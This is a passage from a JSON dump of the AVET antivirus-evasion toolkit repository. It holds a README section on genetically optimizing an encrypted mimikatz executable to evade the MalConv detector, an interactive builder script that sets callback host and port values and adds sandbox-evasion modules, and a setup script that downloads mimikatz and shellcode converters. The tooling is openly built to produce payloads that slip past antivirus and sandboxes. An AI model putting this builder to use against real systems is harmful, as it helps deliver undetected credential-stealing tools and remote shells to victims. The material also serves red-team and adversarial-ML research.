injected content.\nThe content is optimized against MalConv, which is a static machine learning-based detector based on a convolutional neural network.\nThe used MalConv implementation is from the [SecML Malware](https://github.com/pralab/secml_malware) library.\n\nGoodware is required and should be put into the `input/goodware_samples` folder.\nThe [DikeDataset](https://github.com/iosifache/DikeDataset) for example is a good source to get benign executable files. The more, the better, but 100 is sufficient for testing purposes.\n\nTo use the optimizer, use the `$genetic_optimizer` command:\n```sh\n$genetic_optimizer -pm $practical_manipulation -p $population_size output/rc4enc_mimikatz_adversarial_win64.exe\n```\nPossible Options:\n```\n-p, --population_size, default=50\n-e, --elitsm, default=10\n-i, --iteration, default=10\n-pr, --penalty_regularizer, default=1e-6\n-ss, --section_size, default=10\n-pm, --practical_manipulation, default=section_injection\n```\n\nMore about adversarial examples, genetic optimizing and MalConv can be read here:\n- [Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection](https://arxiv.org/abs/2008.07125)\n- [Functionality-preserving Black-box Optimization of Adversarial Windows Malware](https://arxiv.org/abs/2003.13526)\n- [Malware Detection by Eating a Whole EXE](https://arxiv.org/abs/1710.09435)\n\n\n## More\n---\n\nFor basics about antivirus evasion, AVET & more information have a look here (most for version 1.3): \n- [https://govolution.wordpress.com/2018/08/07/paper-avet-blackhat-usa-arsenal-2018/](https://govolution.wordpress.com/2018/08/07/paper-avet-blackhat-usa-arsenal-2018/)\n- [https://govolution.wordpress.com/2017/06/11/avet-video/](https://govolution.wordpress.com/2017/06/11/avet-video/)\n- [https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf](https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf)\n- [https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf](https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf)\n- [https://twitter.com/DanielX4v3r](https://twitter.com/DanielX4v3r)\n- [https://github.com/govolution/avetosx](https://github.com/govolution/avetosx)\n- [https://github.com/tacticaljmp](https://github.com/tacticaljmp)\n- [https://github.com/Mr-Un1k0d3r/DKMC](https://github.com/Mr-Un1k0d3r/DKMC)\n- [https://github.com/m0n0ph1/Basic-File-Crypter](https://github.com/m0n0ph1/Basic-File-Crypter)\n- [https://github.com/hasherezade/pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)\n- [https://github.com/hasherezade/demos/](https://github.com/hasherezade/demos/)\n- [https://github.com/a0rtega/pafish](https://github.com/a0rtega/pafish)\n- [https://danielsauder.com](https://danielsauder.com)\n\n"
        },
        {
          "name": "avet.py",
          "type": "blob",
          "size": 5.9521484375,
          "content": "#!/usr/bin/python3.9\n\nimport os\nimport stat\nimport glob\nimport readline\nimport subprocess\n\n\ndef print_banner():\n    banner = \"\"\"\n                       .|        ,       +\n             *         | |      ((             *\n                       |'|       `    ._____\n         +     ___    |  |   *        |.   |' .---\"|\n       _    .-'   '-. |  |     .--'|  ||   | _|    |\n    .-'|  _.|  |    ||   '-__  |   |  |    ||      |\n    |' | |.    |    ||       | |   |  |    ||      |\n ___|  '-'     '    \"\"       '-'   '-.'    '`      |____\njgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n\"\"\"\n    print(banner)\n    print(\"\\nWelcome to the avet Assistant!\\n\")\n\n\n# define rlinput (for user input with placeholder)\ndef rlinput(prompt, prefill=''):\n    readline.set_startup_hook(lambda: readline.insert_text(prefill))\n    try:\n        return input(prompt)\n    finally:\n        readline.set_startup_hook()\n\n\n# Helper function to remove a prefix from a string.\n# Starting from python 3.9+ removeprefix() can be used instead.\ndef remove_prefix(text, prefix):\n    if text.startswith(prefix):\n        return text[len(prefix):]\n    return text\n\n\n# This fuction opens global_connect_config.sh and returns host and port\ndef fetch_global_connect():\n    with open(\"./global_connect_config.sh\") as connect:\n        for line in connect:\n            if line[0:13] == \"GLOBAL_LHOST=\":\n                host = line[13:].strip()\n            if line[0:13] == \"GLOBAL_LPORT=\":\n                port = line[13:].strip()\n\n    return host, port\n\n\n# Enumerate and print available build scripts in /build.\n# The user can make choose one of the build scripts to configure.\ndef print_build_scripts():\n    os.chdir(\"./build\")\n\n    build_scripts = glob.glob('./build*.sh')\n    build_scripts.sort()\n    for i, script in enumerate(build_scripts):\n        print(\"%d : %s\" % (i, remove_prefix(script, \"./\")))\n\n    print(\"\\nWhich Script would you like to configure and build?\")\n    return build_scripts[int(input(\"Enter the corresponding number -> \"))]\n\n\n# Print the information between the #Tags in the build script\ndef print_tag(choice, tag):\n    print(\"\\n%s :\" % tag)\n    with open(choice, 'r') as file:\n        switch = False\n        for line in file:\n            if line == \"#%s_END\\n\" % tag:\n                switch = False\n\n            if switch:\n                print(line, end='')\n\n            if line == \"#%s_START\\n\" % tag:\n                switch = True\n\n\n# Here, the user is able to make changes in the selected build script between the #CONFIGURATION Tags\n# The whole build script with changes will be copied to a temporary script \"avet_script_config.sh\"\ndef build_script_configurator(choice):\n    print(\"\\nConfigure the Build Script\")\n    with open(choice, 'r') as file:\n        script = file.readlines()\n    with open(\"./avet_script_config.sh\", 'w') as config:\n        switch = False\n        for line in script:\n\n            if line == '#CONFIGURATION_END\\n':\n                switch = False\n\n                # sandbox evasions\n                print(\"\\nDo you want to add sandbox evasions? [y/N]\")\n                answer = input(\"-> \").lower().strip()\n                if answer == \"y\" or answer == \"yes\":\n                    modules = sandbox_evasions_pick()\n\n                    for sand in modules:\n                        evasion = rlinput(\"-> \", \"add_evasion %s \" % sand)\n                        config.write(evasion + \"\\n\")\n\n            if switch:\n                if line[0:2] == \"# \":\n                    print(\"\\n\"+line.strip())\n                else:\n                    # Replace host and port Variable with the decimal numbers configured in global_connect_config.sh\n                    if \"$GLOBAL\" in line:\n                        host, port = fetch_global_connect()\n                        if line[0:6] == \"LPORT=\":\n                            current_line = rlinput(\"-> \", \"LPORT=\" + port)\n                        elif line[0:6] == \"LHOST=\":\n                            current_line = rlinput(\"-> \", \"LHOST=\" + host)\n\n                    # only configure the key, not the raw file\n                    elif \"generate_key\" in line:\n                        current_line = rlinput(\"-> \", line[0:-19])\n                        current_line += line[-19:]\n                    else:\n                        current_line = rlinput(\"-> \", line.strip())\n\n                    config.write(current_line + \"\\n\")\n            else:\n                config.write(line)\n\n            if line == '#CONFIGURATION_START\\n':\n                switch = True\n        print(\"\\nExecutable will be created Shortly please wait.\\n\")\n\n\n# In this function the user picks from a list of sandbox evasions.\n# The chosen evasions are returned as a list.\ndef sandbox_evasions_pick():\n    sandbox_modules = glob.glob(\"../source/implementations/evasion/*.h\")\n    sandbox_modules.sort()\n    sandbox_modules.insert(0, \"Finished Picking, Stop Here\")\n    to_add = []\n    while True:\n        for i, module in enumerate(sandbox_modules):\n            print(\"%d : %s\" % (i, remove_prefix(\n                module, \"../source/implementations/evasion/\")[:-2]))\n\n        print(\"\\nWhich module would you like to add?\")\n        choice = int(input(\"Enter the corresponding number -> \"))\n        if choice == 0:\n            break\n        to_add.append(remove_prefix(\n            sandbox_modules[choice], \"../source/implementations/evasion/\")[:-2])\n        sandbox_modules.pop(choice)\n\n    return to_add\n\n\n# The tempory script will be executed\ndef build():\n    os.chdir(\"..\")\n\n    st = os.stat('./build/avet_script_config.sh')\n    os.chmod('./build/avet_script_config.sh', st.st_mode | stat.S_IEXEC)\n\n    process = subprocess.run(\n        [\"./build/avet_script_config.sh\"], stdout=subprocess.PIPE)\n    output = process.stdout.decode(\"utf-8\")\n    print(output)\n    print(\"Your executable should be in the output folder!\")\n\n\ndef main():\n    print_banner()\n    choice = print_build_scripts()\n    print_tag(choice, \"DESCRIPTION\")\n    build_script_configurator(choice)\n    build()\n\n    os.remove(\"./build/avet_script_config.sh\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "banner.txt",
          "type": "blob",
          "size": 1.087890625,
          "content": "*** ============================================= ***\n\n         .==,_                                          \n        .===,_`\\\\                                        \n      .====,_ ` \\\\      .====,__                         \n---     .==-,`~. \\\\           `:`.__,                    \n ---      `~~=-.  \\\\           /^^^     MEEP MEEP        \n   ---       `~~=. \\\\         /                          \n                `~. \\\\       /                           \n                  ~. \\\\____./                            \n                    `.=====)                            \n                 ___.--~~~--.__                         \n       ___\\\\.--~~~              ~~~---.._|/              \n       ~~~\\\\\\\"                             /              \n\n ________  ___      ___ _____  __________  \n|\\   __  \\|\\  \\    /  /|\\  __\\ |\\___   __\\ \n\\ \\  \\|\\  \\ \\  \\  /  / | \\ \\__ \\|__|\\  \\_| \n \\ \\   __  \\ \\  \\/  / / \\ \\  _\\    \\ \\  \\  \n  \\ \\  \\ \\  \\ \\    / /   \\ \\ \\___   \\ \\  \\ \n   \\ \\__\\ \\__\\ \\__/ /     \\ \\____\\   \\ \\__\\\n    \\|__|\\|__|\\|__|/       \\|_____|   \\|__|\n\n*** ============================================= ***\n\n"
        },
        {
          "name": "build",
          "type": "tree",
          "content": null
        },
        {
          "name": "build_script_tester.py",
          "type": "blob",
          "size": 1.93359375,
          "content": "#!/usr/bin/python3\n\nimport os\nimport glob\nimport subprocess\nimport re\n\n# get list of build scripts and create directory named testing\nbuild_scripts = glob.glob('./build/build*.sh')\ncount = len(build_scripts)\n\nif not os.path.isdir(\"./testing\"):\n    os.mkdir(\"./testing\")\n\n\n# Create File. If it exists already, it will be cleared\nopen(\"./testing/result.txt\", 'w').close()\n\n\n# prepare for summary\nfailed = \"Build Scripts with errors:\\n\"\n\n\n# run all build scripts and save output in buffer\nbuffer = []\ncurrent = 1\nfor script in build_scripts:\n    print(\"\\n[%d/%d]\\t--Testing %s--\" % (current, count, script[8:]))\n    process = subprocess.run(\n        [script], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n    output = process.stdout.decode(\"utf-8\")\n\n    buffer.append(\"--Testing  %s--\\n%s\" % (script[8:], output))\n\n    current_script = script[14:-3]\n\n    # test for errors while building\n    # Search for keywords in stdout and stderr\n    keywords = [\"cannot find\", \"fault\", \"unable\", \"error\", \"Error\",\n                \"Unable\", \"No such file or directory\", \"warning\", \"undeclared\"]\n    if any(x in output for x in keywords):\n        failed += \"%s:\\n\" % current_script\n        for item in keywords:\n            finding = re.search(\".*\"+item+\".*\", output)\n            if bool(finding):\n                print(finding.group())\n                failed += \"\\t%s:\\n\" % finding.group()\n\n    # test if .exe is generated\n    if os.path.isfile(\"./output/%s.exe\" % current_script):\n        print(\"%s executable could be created\\n\" % current_script)\n    else:\n        print(\"%s executable could NOT be created\\n\" % current_script)\n        failed += \"\\t%s executable could NOT be created\\n\" % current_script\n    current += 1\n\n\n# print summary\nsummary = \"---------------------------Summary---------------------------\\n\"\nsummary += failed\n\nprint(summary)\n\n\n# write buffer in file result.txt\nbuffer.append(summary)\nwith open(\"./testing/result.txt\", 'w') as result:\n    result.writelines(buffer)\n"
        },
        {
          "name": "images",
          "type": "tree",
          "content": null
        },
        {
          "name": "input",
          "type": "tree",
          "content": null
        },
        {
          "name": "output",
          "type": "tree",
          "content": null
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0.7236328125,
          "content": "autopep8==2.0.0\ncertifi==2022.9.24\ncharset-normalizer==2.1.1\ncontourpy==1.0.6\ncycler==0.11.0\nfonttools==4.38.0\nidna==3.4\njoblib==1.2.0\nkiwisolver==1.4.4\nlief==0.12.2\nmatplotlib==3.0.3\nmpmath==1.2.1\nnetworkx==3.0rc1\nnumpy==1.23.4\nnvidia-cublas-cu11==11.10.3.66\nnvidia-cuda-nvrtc-cu11==11.7.99\nnvidia-cuda-runtime-cu11==11.7.99\nnvidia-cudnn-cu11==8.5.0.96\npackaging==21.3\nPillow==9.3.0\npycodestyle==2.9.1\npyparsing==3.0.9\npython-dateutil==2.8.2\npython-magic==0.4.27\nrequests==2.28.1\nscikit-learn==1.1.3\nscipy==1.9.3\nsecml==0.13.post1\nsix==1.16.0\nsympy==1.11.1\nthreadpoolctl==3.1.0\ntomli==2.0.1\ntorch==1.14.0.dev20221115+cu117\ntorchaudio==0.14.0.dev20221115+cu117\ntorchvision==0.15.0.dev20221115+cu117\ntyping_extensions==4.4.0\nurllib3==1.26.12\n"
        },
        {
          "name": "setup.sh",
          "type": "blob",
          "size": 1.740234375,
          "content": "#!/bin/bash\n# This is a setup script to get AVET ready to use on a 64-bit Kali system.\n# You still have to \"next\" through the tdm-gcc installer GUI, though.\n\necho \"+++ Preparing AVET for use...\"\n\necho \"+++ Installing wine and wine32\"\n# add missing sources for wine32\nsudo dpkg --add-architecture i386\nsudo apt update\nsudo apt install wine -y\nsudo apt install wine32 -y\n\n# Install mingw crosscompiler\nsudo apt install mingw-w64 -y\nsudo apt install jq -y\n\necho \"+++ Downloading and installing tdm-gcc via wine\"\nwget https://github.com/jmeubank/tdm-gcc/releases/download/v9.2.0-tdm64-1/tdm64-gcc-9.2.0.exe\nwine tdm64-gcc-9.2.0.exe\nrm tdm64-gcc-9.2.0.exe\n\n\nwhile true; do\n    read -p \"Do you want to download the dependencies AVET needs? [y/n]\" yn\n    case $yn in\n        [Yy]* ) # Install dependencies\n            echo \"+++ Downloading Mimikatz\"\n            curl -s https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest \\\n            | jq -r '.assets[].browser_download_url' \\\n            | grep .'zip' \\\n            | wget -i -\n            unzip -j mimikatz_trunk.zip x64/mimikatz.exe -d input/\n            rm mimikatz_trunk.zip\n\n            echo \"+++ Downloading pe2shc\"\n            mkdir ../pe_to_shellcode\n            curl -s https://api.github.com/repos/hasherezade/pe_to_shellcode/releases/latest \\\n            | jq -r '.assets[].browser_download_url' \\\n            | grep 'pe2shc' \\\n            | wget -i -\n            mv pe2shc.exe ../pe_to_shellcode\n\n            echo \"+++ Cloning DKMC\"\n            git clone https://github.com/Mr-Un1k0d3r/DKMC.git\n            mv DKMC/ ../ ; break;;\n        [Nn]* )\n            echo \"Dependencies not installed!\"\n            break;;\n        * ) echo \"Please answer yes or no.\";;\n    esac\ndone\n\necho \"+++ Finished setup procedure!\"\n"
        },
        {
          "name": "source",
          "type": "tree",
          "content": null
        },
        {
          "name": "test_payloads",
          "type": "tree",
          "content": null
        },
        {
          "name": "tools",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}